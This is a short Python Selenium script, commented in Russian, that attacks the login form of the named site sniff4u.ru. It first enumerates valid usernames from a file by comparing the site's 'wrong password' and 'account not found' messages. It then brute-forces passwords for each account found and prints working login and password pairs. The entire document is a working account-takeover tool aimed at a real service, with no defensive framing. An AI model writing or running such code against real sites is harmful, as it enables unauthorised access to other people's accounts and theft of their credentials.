from selenium import webdriver #Импортируем библиотеку для работы с браузером
import time # Импортируем библиотеку для работы с временем

#подключаем CHROMEDRIVER
browser = webdriver.Chrome('chromedriver.exe')


#Функция нужна для того искать пароли к аккаунтам
#Принимает один аргумент : LOG - логин аккаунта
def passworld(LOG):
	#Открывает страницу sniff4u.ru
	browser.get('http://sniff4u.ru/')
	#Перебираем пароли
	for a in open('pass.txt').read().split('\n'):
		browser.find_element_by_xpath('/html/body/div[1]/div/form/div/div[1]/input').send_keys(LOG)
		browser.find_element_by_xpath('/html/body/div[1]/div/form/div/div[2]/input').send_keys(a)
		browser.find_element_by_xpath('//*[@id="button_auth"]').click()

		try:
			#Проверяем вошел ли пользователь на сайт
			#Если вошел то пишем в консоль его логин и пароль
			if browser.find_element_by_xpath('/html/body/div[1]/header/div/ul[2]/li[3]')['data-tooltip'].split(':')[0] == 'Авторизован как':
				print('Логин: {}  Пароль: {}'.format(LOG, a))
		except:
			pass
		#Открываем страницу sniff4u.ru, точнее перезапускаем (обновляем) для того чтобы очистить поля 
		browser.get('http://sniff4u.ru/')

#Функция нужна для того чтобы перебрать логины
def login():
	#Открываем страницу sniff4u.ru
	browser.get('http://sniff4u.ru/')
	#Перебираем логины из папки
	for i in open('login.txt').read().split('\n'):
		#Вписываем логин
		browser.find_element_by_xpath('/html/body/div[1]/div/form/div/div[1]/input').send_keys(i)
		#Вписываем любой пароль, мы лишь проверяем есть ли учетная запись с таким логином
		browser.find_element_by_xpath('/html/body/div[1]/div/form/div/div[2]/input').send_keys('s123456789534')
		#Нажимаем на кнопку 'Войти'
		browser.find_element_by_xpath('//*[@id="button_auth"]').click()

		#Время нужно чтобы дать странице прогрузится
		time.sleep(1.5)

		#Проверяем на валидность логин
		#Если логин подходит то высвечивается 'Вы ввели неверный пароль..', и мы запускаем функцию по перебору паролей
		#Если не подходит то высвечивается 'Учетная запись не найдена!', мы просто пропускаем этот логин
		if browser.find_element_by_xpath('/html/body/div[1]/div/div').text == 'Вы ввели неверный пароль..':
			print('Логин найден: {}'.format(i))
			passworld(i)
			browser.get('http://sniff4u.ru/')	
		elif browser.find_element_by_xpath('/html/body/div[1]/div/div').text == 'Учетная запись не найдена!':
			browser.get('http://sniff4u.ru/')


if __name__ == '__main__':
	login()